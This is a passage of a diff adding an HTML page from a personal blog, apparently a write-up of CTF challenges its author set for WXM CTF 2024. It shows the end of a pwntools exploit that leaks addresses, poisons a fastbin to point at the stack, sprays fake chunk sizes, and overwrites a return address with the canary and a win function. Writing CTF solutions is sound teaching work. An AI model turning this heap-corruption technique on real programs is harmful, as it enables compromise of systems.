+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">112</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">bin_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"bin_leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_leak</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">exe</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">bin_leak</span><span class="o">-</span><span class="mi">19776</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">f</span><span class="s">'(+ "@" </span><span class="si">{</span><span class="n">heap_leak</span><span class="o">+</span><span class="mi">7208</span><span class="si">}</span><span class="s">)'</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">heap_key</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"heap_key: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_key</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># Corrupt 0x20 fastbins inside of the heap so fwd ptr points to the stack.
+</span><span class="n">stack_xor</span> <span class="o">=</span> <span class="p">(</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">10392</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"##</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> \
+    <span class="n">p64</span><span class="p">((</span><span class="n">stack_leak</span><span class="o">-</span><span class="mi">10392</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span><span class="o">^</span><span class="n">heap_leak</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"BEG '</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+
+<span class="c1"># Spray the stack with p64(0x21) values so ptmalloc wont complain about
+# corrupted size. The overwritten fastbin points to a place on the stack
+# where there are the 0x21 values.
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"aaabbbb'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1000</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+<span class="c1"># Corrupt the stack. yay!
+</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&lt;&lt;&lt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">'"AAAA" "AAAA</span><span class="se">\x00</span><span class="s">BB'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> \
+                 <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'you_should_be_able_to_solve_this'</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'"'</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/ctf/pwn/c/2024/03/31/Challenges-I-Wrote-For-WXM-CTF-2024.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">poni&#39;s blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">poni&#39;s blog</li><li><a class="u-email" href="mailto:poniponiponiponiponiponiponiponiponiponi@protonmail.com">poniponiponiponiponiponiponiponiponiponi@protonmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/poniponiponiponiponiponiponiponiponi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">poniponiponiponiponiponiponiponiponi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>My tech blog where I write about things I find interesting. Mostly low level programming, linux and ctf competitions.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
